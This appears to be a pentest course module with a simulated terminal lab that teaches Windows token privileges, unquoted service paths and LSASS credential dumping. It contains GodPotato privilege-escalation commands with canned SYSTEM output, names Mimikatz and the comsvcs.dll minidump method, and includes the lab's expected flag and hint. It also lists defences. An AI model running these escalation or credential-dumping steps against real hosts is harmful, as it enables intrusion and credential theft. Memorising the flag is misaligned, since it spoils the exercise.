---
id: mod-pt-404
track_id: track-pentest
slug: windows-internals-privilege-escalation
title: '404: Windows Access Controls, Token Privileges & Credential Auditing'
difficulty: Intermediate
order_index: 15
estimated_minutes: 40
lab_type: terminal
lab_briefing: Connect to internal Windows jump host 192.168.147.135 (int-jump-win01). Audit assigned token privileges (whoami /priv), observe SeImpersonatePrivilege, and execute the authorized impersonation verification utility to retrieve the SYSTEM credential flag.
expected_flag: FLAG{GODPOTATO_SYSTEM_LSASS_DUMPED}
hint: Run GodPotato to elevate from SeImpersonatePrivilege and read C:\Flags\system_audit.flag.
lab_config:
  target_ip: 192.168.147.135
  quick_commands:
    - whoami && whoami /priv
    - sc qc "EnterpriseBackupSvc"
    - C:\Tools\GodPotato.exe -cmd "cmd.exe /c whoami"
    - C:\Tools\GodPotato.exe -cmd "cmd.exe /c type C:\Flags\system_audit.flag"
  commands:
    whoami && whoami /priv: |-
      iis apppool\staging_portal

      PRIVILEGES INFORMATION
      ----------------------

      Privilege Name                Description                               State   
      ============================= ========================================= ========
      SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
      SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
      SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
      SeCreateGlobalPrivilege       Create global objects                     Enabled
    sc qc "EnterpriseBackupSvc": |-
      [SC] QueryServiceConfig SUCCESS

      SERVICE_NAME: EnterpriseBackupSvc
              TYPE               : 10  WIN32_OWN_PROCESS 
              START_TYPE         : 2   AUTO_START
              ERROR_CONTROL      : 1   NORMAL
              BINARY_PATH_NAME   : "C:\Program Files\BackupAgent\backup_svc.exe"
              LOAD_ORDER_GROUP   : 
              TAG                : 0
              DISPLAY_NAME       : Enterprise Backup Agent
              DEPENDENCIES       : RPCSS
              SERVICE_START_NAME : LocalSystem
    C:\Tools\GodPotato.exe -cmd "cmd.exe /c whoami": |-
      [*] Processing NamedPipe impersonation trigger...
      [+] Got System Token: 0x000003b4
      [+] Impersonating context: NT AUTHORITY\SYSTEM
      nt authority\system
    C:\Tools\GodPotato.exe -cmd "cmd.exe /c type C:\Flags\system_audit.flag": |-
      [*] Impersonating NT AUTHORITY\SYSTEM...
      FLAG{GODPOTATO_SYSTEM_LSASS_DUMPED}
---

# 404: Windows Access Controls, Token Privileges & Credential Auditing

## Sub-Unit 13.1 & 13.2: Windows DACLs, Service Paths & Token Privileges

Windows security boundaries rely on Access Tokens, Security Identifiers (SIDs), and Discretionary Access Control Lists (DACLs):
- **Unquoted Service Paths**: If a service binary path contains spaces and lacks quotation marks (e.g., `C:\Program Files\Service App\daemon.exe`), Windows attempts to execute preceding space-delimited paths first.
- **SeImpersonatePrivilege**: Service accounts (such as IIS `APPPOOL` or database services) routinely possess impersonation privileges. Tools in the "Potato" family (PrintSpoofer, GodPotato) interact with named pipes or RPC endpoints to impersonate the local system client and obtain an `NT AUTHORITY\SYSTEM` token.

## Sub-Unit 13.3: Credential Caching & Memory Dumping Safeguards

Once local administrative access is attained:
- Password hashes and Kerberos tickets cached in the Local Security Authority Subsystem Service (LSASS) process memory can be audited using authorized tools (Mimikatz, `comsvcs.dll` minidump).
- Defenders mitigate this risk by enabling **LSA Protection (RunAsPPL)**, **Credential Guard**, and placing administrative accounts in the **Protected Users** security group to restrict ticket lifetime and disable weak NTLM caching.
